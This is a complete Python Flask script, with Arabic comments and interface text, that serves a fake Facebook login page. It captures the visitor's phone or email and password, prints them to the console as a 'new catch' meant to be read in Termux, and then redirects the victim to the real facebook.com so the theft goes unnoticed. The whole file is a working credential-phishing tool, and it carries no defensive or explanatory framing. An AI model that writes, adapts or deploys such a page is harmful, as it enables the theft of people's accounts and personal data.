from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# واجهة فيسبوك مموهة
html = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;padding-top:50px;font-family:sans-serif;">
<div style="background:white;padding:20px;border-radius:8px;width:330px;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center;">
<h1 style="color:#1877f2;">facebook</h1>
<form action="/login" method="POST">
<input type="text" name="u" placeholder="الهاتف أو البريد" style="width:100%;padding:12px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;" required>
<input type="password" name="p" placeholder="كلمة السر" style="width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;" required>
<button style="width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-weight:bold;">تسجيل الدخول</button>
</form></div></body></html>
"""

@app.route('/')
def home(): return render_template_string(html)

@app.route('/login', methods=['POST'])
def login():
    # هذا السطر هو اللي يبعثلك المعلومات لـ Termux (Logs)
    print(f"\\n🎯 صيد جديد: {request.form.get('u')} | 🔑: {request.form.get('p')}\\n")
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
